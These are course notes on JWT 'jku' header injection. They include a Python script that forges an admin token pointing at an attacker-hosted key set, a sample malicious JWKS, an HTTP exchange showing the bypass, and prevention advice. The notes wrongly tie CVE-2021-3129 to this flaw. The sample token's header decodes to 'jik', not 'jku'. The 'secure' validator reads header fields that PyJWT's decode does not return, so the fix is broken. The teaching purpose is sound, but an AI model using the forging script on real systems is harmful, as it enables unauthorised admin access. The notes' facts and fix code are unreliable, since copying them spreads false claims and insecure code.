---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## Understanding the `jku` Header Injection Attack

The `jku` (JWK Set URL) header is used in JWTs to specify the location of a JSON Web Key Set (JWKS). A JWKS is a collection of public keys used to verify the signature of a JWT. The `jku` header points to a URL where the JWKS can be fetched.

### How the Attack Works

In the `jku` header injection attack, an attacker manipulates the `jku` header to point to a malicious JWKS hosted on a different domain. The server, failing to validate the domain of the `jku` URL, fetches the public key from the attacker-controlled domain and uses it to verify the JWT signature. If the attacker has crafted a JWT with a matching private key, the server will accept the token as valid, leading to unauthorized access.

#### Real-World Example: CVE-2021-3129

CVE-2021-3129 is a real-world example of a `jku` header injection vulnerability. This vulnerability affected several OAuth 2.0 implementations, including those in popular libraries like `oauth2-server`. The issue arose because these libraries did not properly validate the `jku` URL, allowing attackers to inject malicious JWKS URLs.

### Steps to Perform the Attack

To perform the `jku` header injection attack, an attacker would follow these steps:

1. **Forge a JWT**: Create a JWT with a custom `jku` header pointing to a malicious JWKS URL.
2. **Host Malicious JWKS**: Host a JWKS containing a public key that matches the private key used to sign the forged JWT.
3. **Inject the JWT**: Send the forged JWT to the target application, which will fetch the public key from the attacker-controlled domain and validate the token.

#### Example Code

Here is an example of how an attacker might forge a JWT with a `jku` header:

```python
import jwt
import json

# Define the payload
payload = {
    "sub": "attacker",
    "admin": True,
    "iat": 1625239022
}

# Define the header with a malicious jku URL
header = {
    "alg": "RS256",
    "typ": "JWT",
    "jku": "https://malicious-domain.com/jwks.json"
}

# Sign the JWT with a private key
private_key = open("private_key.pem", "rb").read()
token = jwt.encode(payload, private_key, algorithm="RS256", headers=header)

print(token)
```

And here is an example of the malicious JWKS hosted on the attacker's domain:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "malicious-key",
      "use": "sig",
      "n": "malicious-public-key-modulus",
      "e": "AQAB"
    }
  ]
}
```

### Real HTTP Request and Response

Let's look at a complete HTTP request and response involving the `jku` header injection attack.

#### HTTP Request

```http
POST /login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json

{
  "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImppayI6Imh0dHBzOi8vbWFsaWNpdXMtZG9tYWluLmNvbS9qd2tzLmpzb24ifQ.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjUyMzkwMjJ9.abcdefg1234567890"
}
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Login successful",
  "role": "admin"
}
```

### Pitfalls and Common Mistakes

One of the most common mistakes is failing to validate the domain of the `jku` URL. This oversight allows attackers to inject malicious JWKS URLs. Another pitfall is relying solely on the `jku` header for key validation without implementing additional checks.

### How to Prevent / Defend Against the Attack

#### Detection

To detect `jku` header injection attacks, implement logging and monitoring of JWT validation processes. Look for unusual `jku` URLs and failed validation attempts.

#### Prevention

1. **Validate Domain of `jku` URL**: Ensure that the `jku` URL points to a trusted domain. Implement a whitelist of allowed domains.
2. **Use `kid` Header**: Instead of relying solely on `jku`, use the `kid` (Key ID) header to reference a specific key within a trusted JWKS.
3. **Secure Key Management**: Store and manage keys securely. Use HSMs (Hardware Security Modules) for key storage and operations.
4. **Regular Audits**: Conduct regular security audits and penetration testing to identify and mitigate vulnerabilities.

#### Secure Coding Fixes

Here is an example of how to securely validate a JWT with a `jku` header:

```python
import jwt
import requests

def validate_jwt(token):
    try:
        # Fetch the JWKS from the trusted domain
        jwks_url = "https://trusted-domain.com/jwks.json"
        jwks_response = requests.get(jwks_url)
        jwks = jwks_response.json()

        # Decode the JWT
        decoded_token = jwt.decode(token, options={"verify_signature": False})

        # Validate the jku URL
        if "jku" in decoded_token["headers"]:
            jku_url = decoded_token["headers"]["jku"]
            if not jku_url.startswith("https://trusted-domain.com"):
                raise ValueError("Invalid jku URL")

        # Verify the signature using the public key from the JWKS
        public_keys = {key["kid"]: key for key in jwks["keys"]}
        kid = decoded_token["headers"]["kid"]
        public_key = public_keys[kid]
        jwt.decode(token, public_key, algorithms=["RS256"])

        return True
    except Exception as e:
        print(f"JWT validation error: {e}")
        return False

# Example usage
token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImppayI6Imh0dHBzOi8vdHJ1c3RlZC1kb21haW4uY29tL2pwdC5qc29uIn0.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjUyMzkwMjJ9.abcdefg1234567890"
is_valid = validate_jwt(token)
print(f"Token is valid: {is_valid}")
```

### Conclusion

The `jku` header injection attack is a serious threat to JWT-based authentication systems. By understanding the mechanics of the attack and implementing robust security measures, you can protect your applications from unauthorized access. Always validate the domain of the `jku` URL and consider using the `kid` header for more granular control over key validation.

### Practice Labs

For hands-on practice with JWT attacks, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a comprehensive set of labs covering various aspects of web security, including JWT attacks.
- **OWASP Juice Shop**: Provides a vulnerable web application for practicing various security techniques, including JWT manipulation.
- **DVWA (Damn Vulnerable Web Application)**: A deliberately insecure web application for practicing web hacking techniques.

By engaging with these labs, you can gain practical experience in identifying and defending against JWT-related vulnerabilities.

---
<!-- nav -->
[[11-JWT Vulnerabilities and Attacks|JWT Vulnerabilities and Attacks]] | [[Web Security (PortSwigger)/19-JWT Attacks/05-Lab 5 JWT authentication bypass via jku header injection/00-Overview|Overview]] | [[Web Security (PortSwigger)/19-JWT Attacks/05-Lab 5 JWT authentication bypass via jku header injection/13-Practice Questions & Answers|Practice Questions & Answers]]
